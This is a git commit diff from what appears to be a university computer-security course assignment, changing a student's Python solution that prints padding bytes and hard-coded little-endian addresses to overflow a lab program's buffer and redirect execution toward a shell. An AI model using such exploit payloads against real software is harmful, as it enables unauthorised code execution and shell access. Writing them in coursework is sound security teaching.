d51f4daa13cd2da53311564aa177f0d356adb741
eecs388 <jack.jusko@gmail.com>
2022-11-17 17:45:17 +0000

    Automatic commit by test script for jjusko

--- sol5.py
+++ sol5.py
@@ -1,9 +1,9 @@
 from shellcode import shellcode
 import sys
-#sys.stdout.buffer.write()
-sys.stdout.buffer.write(b'A'*12)
+sys.stdout.buffer.write(b'A'*10)
 sys.stdout.buffer.write(0x08070820.to_bytes(4, 'little'))
-sys.stdout.buffer.write(bytes("/bin/sh", "utf-8"))
+sys.stdout.buffer.write(b'A'*4)
+sys.stdout.buffer.write(0xfff6e9c6.to_bytes(4, 'little'))
 
 #sys.stdout.buffer.write(b'A'*6)
 
